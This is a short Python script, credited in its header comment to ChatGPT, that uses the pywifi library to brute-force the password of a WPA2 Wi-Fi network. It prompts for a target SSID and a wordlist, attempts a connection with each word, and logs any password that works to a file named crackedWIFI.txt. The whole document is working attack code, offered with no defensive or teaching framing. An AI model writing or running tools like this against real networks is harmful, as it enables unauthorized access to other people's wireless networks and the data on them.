# Made by ChatGPT

import pywifi
from pywifi import const
import time

def test_password(ssid, password, iface):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(2)

    if iface.status() == const.IFACE_CONNECTED:
        print(f"[+] Password FOUND: {password}")
        with open("crackedWIFI.txt", "a") as log:
            log.write(f"{ssid}   |   {password}\n")
        iface.disconnect()
        return True
    else:
        print(f"[-] Tried: {password}")
        iface.disconnect()
        time.sleep(1)
        return False

def main():
    ssid = input("Enter Target SSID: ")
    wordlist = input("Enter path to wordlist: ")

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            password = line.strip()
            if test_password(ssid, password, iface):
                break

if __name__ == "__main__":
    main()
